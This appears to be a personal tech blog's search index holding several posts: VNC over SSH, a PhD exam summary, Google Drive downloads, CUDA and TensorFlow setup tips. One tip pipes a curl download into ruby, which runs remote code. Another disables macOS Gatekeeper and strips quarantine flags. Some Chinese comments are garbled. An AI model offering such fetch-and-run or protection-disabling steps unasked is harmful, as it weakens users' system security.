$HOME/.Xresourcesxsetroot -solid grey#x-terminal-emulator -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" &amp;#x-window-manager &amp;# Fix to make GNOME workexport XKL_XMODMAP_DISABLE=1/etc/X11/Xsession  Restart the vncserversudo chmod +x ~/.vnc/xstartup # set priviledge for the startup filevncserver # restart vncserverOn your own computer:  build a ssh channelssh -p &lt;server port&gt; -L 5901:127.0.0.1:5901 -C -N -l &lt;username on remote server&gt; &lt;remote server ip&gt; # set a secure tunnel on local machine  Use your personal vnc client to connect the server on vnc://127.0.0.1:5901.Some tips:  I found that one account can build the same desktop once, even including the physical monitor I use connecting to the machine. Otherwise, it cannot build the new desktop (deadlock and sigkilled) or just shows the background color without any icons and menu.          The possible reason is that when one desktop shows the folders in one vnc session, the resources are occupied and other desktops cannot get access to them which can just show blank background.      "
  },
  
  {
    "title": "Preliminary Exam Summary",
    "url": "/posts/Preliminary_Exam_Summary/",
    "categories": "",
    "tags": "PhD",
    "date": "2020-11-20 00:00:00 -0800",
    





    
    "snippet": "In the blog, I would like to share the nearly one-month preparation for the Preliminary Exam. It is a pretty tough and exciting experience. Since it is the first time I take part in exams of specia...",
    "content": "In the blog, I would like to share the nearly one-month preparation for the Preliminary Exam. It is a pretty tough and exciting experience. Since it is the first time I take part in exams of specialized courses in English and online and I need to overcome the time issue that taking the exam from 1 a.m. to 7 a.m., it sounds pretty difficult and terrible. But after I finish the writing exam and raise my head to see the sun rise, I think it is deserved.Our prelim exam includes two part: Writing exam and Oral exam. The details and exam references are listed here.In the writing one, we will take three exams including Computer Organization, Algorithm and Operating System. Each exam costs one and a half hours. As to the preparation, I concentrate on the books since it is the only official materials. I review the whole required chapters of each book twice. And I write a summary for each important ideas and concepts to help me to remember and review.Computer OrganizationAs to the Computer Organization, the book covers the following main domains. The book introduces lots of details since different systems use different techniques. But it is not important and I just skip the implementation parts and real world examples.  Chapter One: Introduction to computer organization. Some performance and efficiency calculation problems. Amdahl‚Äôs Laws.  Chapter Two: MIPS Instructions.  Chapter Three: Arithmetic.  Chapter Four: Processor, datapath and related hazards.  Chapter Five: Cache. Virtual Memory.  Chapter Six: Parallel processors. Multithreading and multicore.The exam is straightforward and not hard as I except. It asks questions about the key concepts and not many implementation details such as Windows, Solars and Linux are required.AlgorithmAs to the Algorithm, the required book is the classic one Introduction to Algorithm. I spend many times on it because I want to take the opportunity to review and enlarge my algorithms‚Äô knowledge. The required chapters includes:  Foundations:          Complexity.      Divide and Conquer: The maximum-subarray problem and Strassen‚Äôs algorithm for matrix multiplication.      Recursion Tree, Substitution Method and Master Method.      Randomized algorithm.        Sorting:          Insertion sort and Merge sort.      Heapsort and Quicksort.      Counting sort, Radix sort and Bucket sort.      Randomized select algorithm including Finding maximum and minimum.        Data Structure:          Elementary data structures: Stacks, Queues, Linked List, Pointers and Objects, Rooted trees.      Hash Table.      Binary Search Tree.        Advanced Design and Analysis Techniques:          Dynamic Programming:                  Rod Cutting.          Matrix-chain multiplication.          Longest common subsequence.          Optimal binary search trees.                    Greedy Algorithm:                  Activity selection problem.          Huffman codes.                      Graph:          Elementary Graph Algorithms:                  Breadth First search.          Depth First search.          Topological sort.          Strongly connected components.                    Minimum Spanning Trees:                  Generic-MST.          Kruskal‚Äôs algorithm.          Prim‚Äôs algorithm.                    Single-Source Shortest Paths:                  Bellman-Ford algorithm.          Directed Acyclic Graph Shortest Paths.          Dijkstra‚Äôs algorithm.          Difference constraints.                    All-pairs Shortest Paths:                  Faster-All-PAIRs-Shortest-Path Algorithm.          Floyd-Warshall algorithm.          Johnsons‚Äô algorithm                    Maximum Flow:                  Ford-Fulkerson Method.          Edmonds-Karp‚Äôs Algorithm.                      NP Completeness and Approximation Algorithm.It is pretty hard to write pseudocode on Canvas so I am out of the time in the exam. The exam contains 7 questions. The first three are about algorithm running time. The middle two are about linked list insertion and sorting. The final two need to use graph algorithm to find the shortest path.Operating SystemAs to the Operating System, I spend over half of my preparing time on it. I learn some implement details written in the book while the exam also does not cover. But I still enjoy the learning since I believe it is useful for my future career.  Process:          Process Control Block      Scheduler      Operation: Creation and Termination.      Communication.        Threads:          Parallelism and Concurrency.      Multithreading Models.        Process Synchronization(Important):          Critical section problem.      Mutex Lock.      Semaphores.      Monitors.        CPU Scheduling:          Scheduling Algorithms.      Multiple Processor Scheduling.      Real-time CPU Scheduling.        Deadlocks:          Necessary Conditions.      Resource-Allocation Graph.      Prevention, Avoidance, Detection and Recovery.        Main Memory:          Contiguous Memory Allocation.      Segmentation.      Paging.      Translation look-aside buffer.      Hierarchical Paging.        Virtual Memory:          Demanding Paging.      Copy-on-Write.      Page Replacement algorithms.      Allocation of Frames.      Memory Mapping.      Allocating Kernel Memory.        Mass Storage Structure:          Magnetic Disk.      Disk Scheduling.      Disk Management.      Redundant Array of Independent Disks.(RAID)        File-System Interface:          Operations.      Access methods.      Directory.      Mount.      File Sharing.        File-System Implementation:          Layered File System.      Virtual File System.      Directory Implementation.      Allocation Methods.      Free-Space Management.        I/O System:          Interrupt Vector.      I/O Hardware.      Application I/O Interface.      I/O Scheduling: Buffering, Caching, Spooling and Device Reservation, Error Handling, Protection.      In the exam, CPU scheduling algorithm, semaphores algorithm, Process Creating and Banker‚Äôs Algorithm are checked. I think I did not write the correct semaphore algorithm since the question is a new situation instead of a classical example from the book.In the oral exam, I zoom with three professors each covers one course. I am not sure whether they try to encourage me or not. While all of them told me that I did a great job in the writing exam.Most of the questions originate from the exam questions. And they will check some related ideas and concepts during the process. Since I have reviewed all the related materials, the question is not very hard. If I cannot give the answers they want, they will hint me until I give the correct answer.After all of the things, I finish my Preliminary Exam. Hope everything goes well. Cross fingers."
  },
  
  {
    "title": "Exploit Command Downloading Methods from Google Drive",
    "url": "/posts/Exploit_Command_Downloading_Methods_of_Google_Drive/",
    "categories": "",
    "tags": "Skills",
    "date": "2020-11-12 00:00:00 -0800",
    





    
    "snippet": "In the blog, we want to exploit several methods to find the best and most convenient way to download files and folders from Google Drive.A quick summary:  Gshell: Need google to vertify the app. Cu...",
    "content": "In the blog, we want to exploit several methods to find the best and most convenient way to download files and folders from Google Drive.A quick summary:  Gshell: Need google to vertify the app. Currently it is not working due to the logging problem.  Gdown: useful to download a single file.  The most convenient way: Gdrive(Go environment needed).  Wget and Curl are also feasible but kind of complicated.Best WayBest way for downloading all the files or folders is gdrive and drive.Generally, we should install golang previously and install gdrive and drive from their github repositories.Then we should pass the OAuth by using drive init ~/gdrive. Be noticed, when google  send a link and require the verification code, the link should be open on the same computer even if the computer is a server.Finally, drive pull -id &lt;file or folder id&gt; and gdrive [global] download [options] &lt;fileId&gt;                    Download file or directory are the straightforward commands to download the files or folders from google drive.Other methods:  Using Gsutil to download file on Google Cloud PlatformThe tutorial is here.  Using scripts or commands to download file on Google driveA convenient way to download file is like that  Gdown  syntax: gdown https://drive.google.com/uc?id=FILE-ID3. A Quick ChoiceMore detailsAs to small file:cd ~export fileid=1yXsJq7TTMgUVXbOnCalyupESFN-tm2ncexport filename=matthuisman.jpg## WGET ##wget -O $filename 'https://docs.google.com/uc?export=download&amp;id='$fileid## CURL ##curl -L -o $filename 'https://docs.google.com/uc?export=download&amp;id='$fileidAs to large file(More than 100MB)cd ~export fileid=1iAJbHqiNwc4nJlP67sp1xLkl5EtC4PU_export filename=all.zip## WGET ##wget --save-cookies cookies.txt 'https://docs.google.com/uc?export=download&amp;id='$fileid -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\\1/p' &gt; confirm.txtwget --load-cookies cookies.txt -O $filename 'https://docs.google.com/uc?export=download&amp;id='$fileid'&amp;confirm='$(&lt;confirm.txt)## CURL ##curl -L -c cookies.txt 'https://docs.google.com/uc?export=download&amp;id='$fileid \\     | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\\1/p' &gt; confirm.txtcurl -L -b cookies.txt -o $filename \\     'https://docs.google.com/uc?export=download&amp;id='$fileid'&amp;confirm='$(&lt;confirm.txt)rm -f confirm.txt cookies.txtLink"
  },
  
  {
    "title": "Machine Learning Tutorial",
    "url": "/posts/Machine-Learning_Tutorial/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2020-10-24 00:00:00 -0700",
    





    
    "snippet": "In this blog, I would like to introduce how to start your machine learning environment on ubuntu equipped with GPUs . The used tools includes:  Miniconda: Independent Python Environment.  Machine L...",
    "content": "In this blog, I would like to introduce how to start your machine learning environment on ubuntu equipped with GPUs . The used tools includes:  Miniconda: Independent Python Environment.  Machine Learning Framework: Pytorch/Tensorflow.I should point out that the CUDA and CuDNN are required to install before following the tutorial. You can check the availability of the packages based on the following command.nvcc --version # check the CUDA versionThe availability of GPUs can be listed by the command: nvidia-smi.1. MinicondaMiniconda is a tool to build a specific python environment for your specific project. The python package installed in the environment will not impact others. Besides, if different versions of the  python package are needed in the same machine, miniconda will make it compatible. If we have completed the project and want to delete the python environment, it is also pretty convenient to remove the whole environment.1.1 Install MinicondaDifferent versions of Miniconda are available in the link.curl -O https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh # install the miniconda installation scriptchmod +x Miniconda3-latest-Linux-x86_64.sh # set access./Miniconda3-latest-Linux-x86_64.sh # run the package1.2 Basic Usageconda create --name &lt;environment name&gt; python=3 # create a environment with python3conda activate &lt;environment name&gt; # activate the environmentconda deactivate # deactivate the environmentconda info --envs # list all available environmentsconda remove -n &lt;environment name&gt; # remove an environmentWhen a miniconda environment is activated, (environment name)will be added before each command line of the terminal.2. Machine Learning FrameworkIn the section, two main machine learning frameworks which are Pytorch and Tensorflow will be introduced. I will discuss how to install them under the miniconda environment.2.1 PytorchThe suitable version of pytorch we want to use is based on both the requirement and the supportive packages‚Äô version. The process to install it is described pretty straightforward on its homepage.Basically, we can use pip install torchvision torch to install the newest version.We can check the availability of GPUs on pytorch by the following codes.import torch # import pytorchtorch.cuda.is_available() # check the available GPUs' number for pytorch2.2 TensorflowInstalling tensorflow can use the similar command by pip install tensorflow-gpu.GPUs‚Äô availability for tensorflow can be checked by the following way.import tensorflow as tftf.test.is_gpu_available(cuda_only=False,min_cuda_compute_capability=None)3. Run ModelsAfter all the steps above, we can clone some models from Github or build personal models by Tensorflow and Pytorch. Some examples are available in tensorflow and pytorch website."
  },
  
  {
    "title": "Tricks Summary 2020",
    "url": "/posts/Ticks_Summary_2020/",
    "categories": "",
    "tags": "PhD",
    "date": "2020-09-12 00:00:00 -0700",
    





    
    "snippet": "In the blog, I record several problems that I met with during coding. I hope the content is helpful.Install Nvidia Driver CUDA and CUDNN on UbuntuOfficial installation tutorial link.      Use Comma...",
    "content": "In the blog, I record several problems that I met with during coding. I hope the content is helpful.Install Nvidia Driver CUDA and CUDNN on UbuntuOfficial installation tutorial link.      Use Command Line: Tutorial        Search for PPA which can be used to install packages by apt-get: link    Following the steps:tutorial    # add ppa and find suitable nvidia-driversudo add-apt-repository ppa:graphics-drivers/ppasudo apt-get updateapt-cache search nvidia-driver# sudo apt-get install nvidia-driver-versionsudo apt-get install nvidia-440# another way to install nvidia driverubuntu-drivers devicessudo ubuntu-drivers autoinstall   # add keys for your specific ubuntu version, be careful about ubuntu1x04sudo apt-key adv --fetch-keys  http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub# if error message:# using the command:# wget http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub# sudo apt-key add 7fa2af80.pubsudo bash -c 'echo \"deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64 /\" &gt; /etc/apt/sources.list.d/cuda.list'   sudo bash -c 'echo \"deb http://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1604/x86_64 /\" &gt; /etc/apt/sources.list.d/cuda_learn.list'   sudo apt-get updatesudo apt install cuda-10-1sudo apt install libcudnn7   # add the following codes to ~/.bashrc# set PATH for cuda installationif [ -d \"/usr/local/cuda/bin/\" ]; then    export PATH=/usr/local/cuda/bin${PATH:+:${PATH}}    export LD_LIBRARY_PATH=/usr/local/cuda/lib64${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}fi   reboot -i   # check settingsnvcc --version/sbin/ldconfig -N -v $(sed 's/:/ /' &lt;&lt;&lt; $LD_LIBRARY_PATH) 2&gt;/dev/null | grep libcudnnnvidia-smi            Reboot system  Then the NVIDIA driver will be installed smoothly.  After that, we should install CUDA.Check CUDA version: cat /usr/local/cuda/version.txt.If we want to download package by ourselves, we should check the website first to find the right version for our system. The greatest way to install it is following the official guide.There is also a supportive tutorial for installation cuda and cudnn for ubuntu.Debian CUDA installRecently, I need to install cuda11-1 and nvidia driver on debian 11. Here is something that I achieve based on the experience.The key point is that the cuda package can be used smoothly on debian 11 from my testing.The faster method is using sudo apt install nvidia-cuda-toolkit . However, it can just install the latest version. In my case, it will install cuda11-2 while torch cannot support such a new version.Then I tried several methods on the internet. But the solution is just based on the previous method.sudo add-apt-repository ppa:graphics-drivers/ppasudo apt-get updatesudo apt install nvidia-driversudo apt-key adv --fetch-keys  http://developer.download.nvidia.com/compute/cuda/repos/debian10/x86_64/7fa2af80.pubsudo bash -c 'echo \"deb http://developer.download.nvidia.com/compute/cuda/repos/debian10/x86_64 /\" &gt; /etc/apt/sources.list.d/cuda.list'sudo apt-get updatesudo apt install cuda-11-1if [ -d \"/usr/local/cuda/bin/\" ]; then    export PATH=/usr/local/cuda/bin${PATH:+:${PATH}}    export LD_LIBRARY_PATH=/usr/local/cuda/lib64${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}fireboot -iThen just enjoy the new world.Conda Usage1. search available python versionconda search \"^python$\"2. Create or Remove conda environmentconda remove --name myenv --allconda create -n env python==3.6Tensorflow Usage Problem Recording1. Tensorflow does not use GPUIn the case, I actually installed cuda and Nvidia driver at first. So it is because I did not add cuda/bin and related library to the .bashrc.By adding the following code to .bashrc file will solve the problem.export PATH=/usr/local/cuda-10.2/bin/:$PATHexport LD_LIBRARY_PATH=/usr/local/cuda-10.2/lib64:${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}Besides, I think it is a useful tutorial for use Tensorflow on GPU.Tensorflow2.1 is not useful for CUDA10.2 due to the lack of some libraries.So I reinstall CUDA10.1 for tensorflow2.1-gpu.Test tensorflow for GPUimport tensorflow as tftf.test.is_gpu_available(cuda_only=False,min_cuda_compute_capability=None)2. Install TensorRT for Tensorflow2-GPU versionOfficial tutorial: TensorRT is not a must for tensorflow-gpu. It is just useful for speed up training process.3. Change CUDA Versionll /usr/local/cuda# make a link for cuda. usage: ln -s source targetln -s /usr/local/cuda-7.5 /usr/local/cudaExplanation4. Cannot visit tensorflow.org official websiteIn the case, the following step is useful for Mac. Linux should edit its specific hosts file.  edit /private/etc/hosts  add 64.233.188.121 www.tensorflow.org5. Tensorflow GPU Allocation ProblemBy default, tensroflow will use all gpu memories to update efficiency. The way to use specific memory is by following codes in two ways. More details are available on the linktf.config.experimental.set_memory_growth:gpus = tf.config.experimental.list_physical_devices('GPU')if gpus:  try:    # Currently, memory growth needs to be the same across GPUs    for gpu in gpus:      tf.config.experimental.set_memory_growth(gpu, True)    logical_gpus = tf.config.experimental.list_logical_devices('GPU')    print(len(gpus), \"Physical GPUs,\", len(logical_gpus), \"Logical GPUs\")  except RuntimeError as e:    # Memory growth must be set before GPUs have been initialized    print(e)tf.config.experimental.set_virtual_device_configuration:gpus = tf.config.experimental.list_physical_devices('GPU')if gpus:  # Restrict TensorFlow to only allocate 1GB of memory on the first GPU  try:    tf.config.experimental.set_virtual_device_configuration(        gpus[0],        [tf.config.experimental.VirtualDeviceConfiguration(memory_limit=1024)])    logical_gpus = tf.config.experimental.list_logical_devices('GPU')    print(len(gpus), \"Physical GPUs,\", len(logical_gpus), \"Logical GPUs\")  except RuntimeError as e:    # Virtual devices must be set before GPUs have been initialized    print(e)6. Pytorch Jupyter set GPUprint(torch.cuda.device_count()) # list visible GPUdevice = torch.device(\"cuda:6\" if torch.cuda.is_available() else \"cpu\") # set GPU for devicemodel_ft = torch.nn.DataParallel(model_ft, device_ids=[0]) # set GPU for models7. Data Loader Problemraw_train_X = next(iter(train_dataloader))[0].numpy() # (100000, 3, 64, 64)raw_train_Y = next(iter(train_dataloader))[1].numpy() # (100000, )The aforementioned code is not right because next(iter(dataloader)) will re-output so the X and Y are not mapping.8. Check label countsunique, counts = np.unique(sy_train, return_counts=True)print(counts)9. Allocation problemWarning: ensorflow/core/framework/allocator.cc:101] Allocation of X exceeds 10% of system memorySolution: The main problem is the batch_size is too big. Sometimes the problem is on related settings like shuffle function intf.data.Dataset.from_tensor_slices((x_train, y_train)).shuffle().10. How to use @tf.function [Need Digging into]When I want to change the gradients when training by function train_step on tensorflow2, I found that if I did not use @tf.function before the train_step function, the accuracy grow very slow. But if I add @tf.function, the process becomes normal without considering optimizers and data type. The related code is here.@tf.functiondef fix_train_step(model, images, labels, all_mask):  with tf.GradientTape() as tape:    predictions = model(images)    loss = loss_object(labels, predictions)  gradients = tape.gradient(loss, model.trainable_variables)  for i in range(len(all_mask)):    gradients[i] = gradients[i] * all_mask[i]  optimizer.apply_gradients(zip(gradients, model.trainable_variables))  train_loss(loss)  train_accuracy(labels, predictions)11. Problem after suspending the MachineAfter I suspend the ubuntu, I met with such problemfailed call to cuInit: CUDA_ERROR_UNKNOWN and I cannot use GPU. Rebooting it probably can solve the problem. As to my case, I reinstall nvidia-smi 440 solve the problem.Related link12. Save Model Problem in Tensorflow2When I want to save a Keras subclass model, it will meet with the no bounded node error when I want to use tf.keras.models.Model to get middle layers‚Äô output. So in tensorflow 2, the suitable way to save and load model is listed as follows.# save model weightsmodel.save_weights(MODEL_FILEPATH + 'weight.h5')model.load_weights(MODEL_FILEPATH + \"weight.h5\")# save whole modeltf.keras.models.save_model(model, MODEL_FILEPATH)model = model.load_weights(MODEL_FILEPATH)13. Check GPU is available or not on tensorflow:print(\"Num GPUs Available: \", len(tf.config.experimental.list_physical_devices('GPU')))tf.config.list_physical_devices('GPU')The version compatible version of Tensorflow details.Other Problems1. Install Cudnn on DebianThe installation steps of installing cudnn on debian is different from that of ubuntu. And the path of cuda related package is not the same of that of ubuntu.Step 1: Download Cudnn on Nvidia official website.Step 2: Add the related lib to the path ./usr/lib/x86_64-linux-gnu/. A good way to find the path is by find . -name libcublas.so.10.Step 3: Check the result of installation of cudnn.2. Use matplotlib to draw 3D gradient descent picturesimport numpy as npimport matplotlib.pyplot as pltfrom ipywidgets import *from mpl_toolkits import mplot3d #Áî®‰∫éÁªòÂà∂3DÂõæÂΩ¢#Ê¢ØÂ∫¶ÂáΩÊï∞ÁöÑÂØºÊï∞def gradJ1(theta):    return 4*thetadef gradJ2(theta):    return 2*theta#Ê¢ØÂ∫¶ÂáΩÊï∞def f(x, y):    return  2*x**2 +y**2def ff(x,y):    return 2*np.power(x,2)+np.power(y,2)def train(lr,epoch,theta1,theta2,up,dirc):    t1 = [theta1]    t2 = [theta2]    for i in range(epoch):        gradient = gradJ1(theta1)        theta1 = theta1 - lr*gradient        t1.append(theta1)        gradient = gradJ2(theta2)        theta2 = theta2 - lr*gradient        t2.append(theta2)    plt.figure(figsize=(20,10))     #ËÆæÁΩÆÁîªÂ∏ÉÂ§ßÂ∞è    x = np.linspace(-3,3,30)    y = np.linspace(-3,3,30)    X, Y = np.meshgrid(x, y)    Z = f(X,Y)    ax = plt.axes(projection='3d')    print(t1, t2, ff(t1,t2))#     ax.scatter(t1, t2, ff(t1,t2), c='black',marker = '*', linewidth=1)    ax.plot_surface(X, Y, Z, rstride=1, cstride=1, cmap='viridis', edgecolor='none', alpha=0.9) #Êõ≤Èù¢Âõæ    #ax.plot_wireframe(X, Y, Z, color='c') #Á∫øÊ°ÜÂõæ#     ax.contour3D(X, Y, Z, 50, cmap='binary')#Á≠âÈ´òÁ∫øÂõæ#     ax.scatter3D(t1, t2, ff(t1,t2), c='black',marker = 'o')    ax.plot(t1, t2, ff(t1,t2), c='black',marker = 'o', markersize=5, zorder=5)#     ax.plot_wireframe(t1, t2, ff(t1,t2))#     ax.plot3D(t1, t2,  ff(t1,t2),'red')    #Ë∞ÉÊï¥ËßÇÂØüËßíÂ∫¶ÂíåÊñπ‰ΩçËßí„ÄÇËøôÈáåÂ∞Ü‰øØ‰ª∞ËßíËÆæ‰∏∫60Â∫¶ÔºåÊääÊñπ‰ΩçËßíË∞ÉÊï¥‰∏∫35Â∫¶    ax.view_init(up, dirc)    plt.savefig(\"./temp.png\")#ÂèØ‰ª•ÈöèÊó∂Ë∞ÉËäÇÔºåÊü•ÁúãÊïàÊûú (ÊúÄÂ∞èÂÄºÔºåÊúÄÂ§ßÂÄºÔºåÊ≠•Èïø)@interact(lr=(0, 2, 0.0002),epoch=(1,100,1),init_theta1=(-3,3,0.1),init_theta2=(-3,3,0.1),up=(-180,180,1),dirc=(-180,180,1),continuous_update=False)#lr‰∏∫Â≠¶‰π†ÁéáÔºàÊ≠•ÈïøÔºâ epoch‰∏∫Ëø≠‰ª£Ê¨°Êï∞   init_theta‰∏∫ÂàùÂßãÂèÇÊï∞ÁöÑËÆæÁΩÆ upË∞ÉÊï¥ÂõæÁâá‰∏ä‰∏ãËßÜËßí dircË∞ÉÊï¥Â∑¶Âè≥ËßÜËßídef visualize_gradient_descent(lr=0.05,epoch=10,init_theta1=-2,init_theta2=-3,up=60,dirc=60):    train(lr,epoch,init_theta1,init_theta2,up,dirc)3. git add new repolink4. Out of memory on PytorchWhen trainingÔºå memory usage of GPU will increase by calculating loss, output. So delete them when they are useless is a suitable way to decrease memory usage.del cost, outprint(\"\\nall\", torch.cuda.memory_allocated())5. Mac New Application Damaged Problemlink      sudo spctl --master-disable          Enable it again: sudo spctl --master-enable            xattr -r -d com.apple.quarantine &lt;path&gt;          ` xattr -r -d com.apple.quarantine /Applications/PDF\\ Expert.app`      6. Display the pictures from the remote ubuntu on the local serverlink  Install xquartz on mac from the link.  Use ssh -X &lt;remote server&gt; to enable x11 forwarding  Run python script with matplotlib to build the connection.Enable OpenCLProblems:  linklibGL error: No matching fbConfigs or visuals foundlibGL error: failed to load driver: swrastset parameters:export LIBGL_ALWAYS_INDIRECT=1export LIBGL_DEBUG=verboseexport LIBGL_ALWAYS_SOFTWARE=1  Open3d Problem[Open3D WARNING] GLFW Error: GLX: Forward compatibility requested but GLX_ARB_create_context_profile is unavailable[Open3D WARNING] Failed to create window[Open3D WARNING] [DrawGeometries] Failed creating OpenGL window.clinfoglxinfo: OpenGL version string: 1.4 (2.1 INTEL-16.1.7) Need to be change to nvidia drivercommand:nvidia-settingssudo prime-select nvidialinkopengl version with GPUhttps://opengl.gpuinfo.org/displayreport.php?id=57387. How to install a editable python packageDetailed TutorialBasically, setup.cfg and setup.py are configured for the editable package.# setup.cfg[metadata]name = local_structureversion = 0.1.0[options]packages = structure# setup.pyimport setuptoolssetuptools.setup()And then use the following command to install the package locally under the package folder: python -m pip install -e .8. The Information about the file system and the cooresponding operating systemLinux:      Best Recommands: Ext4        Do not support: Exfat, Fat  Mac:      Do not support: Ext4        Need kernel extension: NTFS        How to format a disk to Ext4  Â¶ÇÊûúÊ≤°Êúâ Homebrew ÁöÑËØùÔºåÈúÄË¶ÅÂÖàÂÆâË£Ö HomebrewÔºö/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"ÂÆâË£Ö e2fsprogsbrew install e2fsprogsÊää U ÁõòÊèíÂà∞ Mac ‰∏äÔºåÊâßË°åÔºödiskutil listÊâæÂà∞Ëá™Â∑± U ÁõòÁöÑÁõòÁ¨¶ÔºåÊØîÂ¶ÇÊàëËøôÈáåÊòØÔºö/dev/disk2s1Ôºå/dev/disk2 (external, physical):   #:                       TYPE NAME                    SIZE       IDENTIFIER   0:     FDisk_partition_scheme                        *31.0 GB    disk2   1:                 DOS_FAT_32 KINGSTON                31.0 GB    disk2s1ÁÑ∂ÂêéÊâßË°åÊ†ºÂºèÂåñÔºödiskutil unmountdisk /dev/disk2s1sudo $(brew --prefix e2fsprogs)/sbin/mkfs.ext4 /dev/disk2s1ÊâßË°åÂëΩ‰ª§Âêé‰ºöË¶ÅÊ±ÇËæìÂÖ•Áî®Êà∑ÂØÜÁ†ÅÔºåÁÑ∂ÂêéËæìÂÖ• y Á°ÆËÆ§ÔºåÁ≠âÂæÖ‰∏Ä‰ºöÂÑøÂ∞±ÂèØ‰ª•‰∫Ü„ÄÇ9. The Related things about external disk on UbuntuWhen we mount a NTFS external disk on Ubuntu, all the files are owned by root and the priviledge is not able to be changed. That will leads to some priviledge problems when using softwares in it.So the most suitable way is using an Ext4 external disk for Ubuntu.10. latex one table covers two columnslink\\usepackage{stfloats}\\begin{table*}[tp]    \\centering    \\begin{tabular}{c|ccc|ccc|ccc|ccc}    \\hline    \\multirow{2}{*}{Case} &amp; \\multicolumn{3}{c}{PointNet++(Random)} &amp; \\multicolumn{3}{c}{PointNet++(\\Mname)} &amp; \\multicolumn{3}{c}{ResGCN-28(Random)} &amp; \\multicolumn{3}{c}{ResGCN-28(\\Mname)} \\\\    &amp; $L_2$ &amp; Acc &amp; mIoU &amp; $L_2$ &amp; Acc &amp; mIoU  &amp; $L_2$ &amp; Acc &amp; mIoU  &amp; $L_2$ &amp; Acc &amp; mIoU  \\\\    \\hline    \\hline    Best    &amp; \\\\    Average &amp; \\\\    Worst   &amp; \\\\    \\hline    \\end{tabular}    \\caption{The results of the non-targeted attack.}    \\label{tab:nt-performance}\\end{table*}11. Oh-my-zsh completions commands with repeated wordslink12. Download Bilibili video automaticallyyou-get -l https://www.bilibili.com/video/BV1U7411a7xG\\?p\\=20 --debugUse you-get command. The syntax is listed as follows:usage: you-get [OPTION]... URL...A tiny downloader that scrapes the weboptional arguments:  -V, --version         Print version and exit  -h, --help            Print this help message and exitDry-run options:  (no actual downloading)  -i, --info            Print extracted information  -u, --url             Print extracted information with URLs  --json                Print extracted URLs in JSON formatDownload options:  -n, --no-merge        Do not merge video parts  --no-caption          Do not download captions (subtitles, lyrics, danmaku, ...)  -f, --force           Force overwriting existing files  --skip-existing-file-size-check                        Skip existing file without checking file size  -F STREAM_ID, --format STREAM_ID                        Set video format to STREAM_ID  -O FILE, --output-filename FILE                        Set output filename  -o DIR, --output-dir DIR                        Set output directory  -p PLAYER, --player PLAYER                        Stream extracted URL to a PLAYER  -c COOKIES_FILE, --cookies COOKIES_FILE                        Load cookies.txt or cookies.sqlite  -t SECONDS, --timeout SECONDS                        Set socket timeout  -d, --debug           Show traceback and other debug info  -I FILE, --input-file FILE                        Read non-playlist URLs from FILE  -P PASSWORD, --password PASSWORD                        Set video visit password to PASSWORD  -l, --playlist        Prefer to download a playlist  -a, --auto-rename     Auto rename same name different files  -k, --insecure        ignore ssl errorsProxy options:  -x HOST:PORT, --http-proxy HOST:PORT                        Use an HTTP proxy for downloading  -y HOST:PORT, --extractor-proxy HOST:PORT                        Use an HTTP proxy for extracting only  --no-proxy            Never use a proxy  -s HOST:PORT, --socks-proxy HOST:PORT                        Use an SOCKS5 proxy for downloading13. Recovery the deleted files on Ubuntutestdisk14. How to set the local Mac to proxy the Ubuntu server‚Äôs packagesStep 1: Open Mac‚Äôs SSH service and Farword configure.Step 2: Set Ubuntu proxy config# add the following two lines on the ~/.bashrcexport https_proxy=127.0.0.1:1234export http_proxy=127.0.0.1:1234# set the ssh channel, 7890 is the VPN proxy portssh -N -f -L localhost:1234:localhost:7890 jason@10.177.74.47&lt;local machine ssh service&gt;# check the port-using processlsof -ti:1234# check the vpn servicecurl -I https://google.com15. A fast way to transfer files between remote servers with progress barrsyncrsync -r --info=progress2 &lt;files path&gt; &lt;username@remote server&gt; 16. Jupyter cannot use the specific environment of condaA helpful link.Basically, the main problem is that the system does not use the jupyter command in the conda environment. Instead, it uses the system default version.We can use the sys.path to check whether we use the correct command or not.If the result of sys.path is like the following, the environment is correct.['/home/jxu/random-fourier-features/examples', '/home/jxu/miniconda3/envs/rf/lib/python37.zip', '/home/jxu/miniconda3/envs/rf/lib/python3.7', '/home/jxu/miniconda3/envs/rf/lib/python3.7/lib-dynload', '', '/home/jxu/miniconda3/envs/rf/lib/python3.7/site-packages', '/home/jxu/miniconda3/envs/rf/lib/python3.7/site-packages/IPython/extensions', '/home/jxu/.ipython']Basically, I did not exploit the detail of the problem this time. But I will list the solution here.I install the jupyterhub by the command: conda install -c conda-forge jupyterhub  from the link.I reinstall it by the commnads from the link.conda install -c conda-forge jupyterlabconda install -c conda-forge nb_conda_kernels# conda install -c conda-forge jupyter_contrib_nbextensionsSome userful jupyter extensions can be found here.17. Use slack to receive signals or messages from the commandsA helpful link.Command for the direct message to the user:curl -X POST --data-urlencode \"payload={\\\"channel\\\": \\\"@memberid\\\", \\\"username\\\": \\\"webhookbot\\\", \\\"text\\\": \\\"The machine with GTX1080 has been rebooted:)\\\", \\\"icon_emoji\\\": \\\":ghost:\\\"}\" &lt;link&gt;Command for the channel message:curl -X POST --data-urlencode \"payload={\\\"channel\\\": \\\"#general\\\", \\\"username\\\": \\\"webhookbot\\\", \\\"text\\\": \\\"The machine with GTX1080 has been rebooted:)\\\", \\\"icon_emoji\\\": \\\":ghost:\\\"}\" &lt;link&gt;For example, we can send a message to the user if the machine reboot.We can write the command to the file \\etc\\rc.local.18. Ubuntu set Default Desktopsudo update-alternatives --config x-session-managersudo dpkg-reconfigure gdm3 # set the default desktopCurrently, I test it on Ubuntu 16.04 and figure out gdm3 cannot be run while lightdm works well. I am not sure the reason."
  },
  
  {
    "title": "Visual Studio Code Plugins",
    "url": "/posts/VS_Code_Plugins/",
    "categories": "",
    "tags": "PhD",
    "date": "2020-04-11 00:00:00 -0700",
    





    
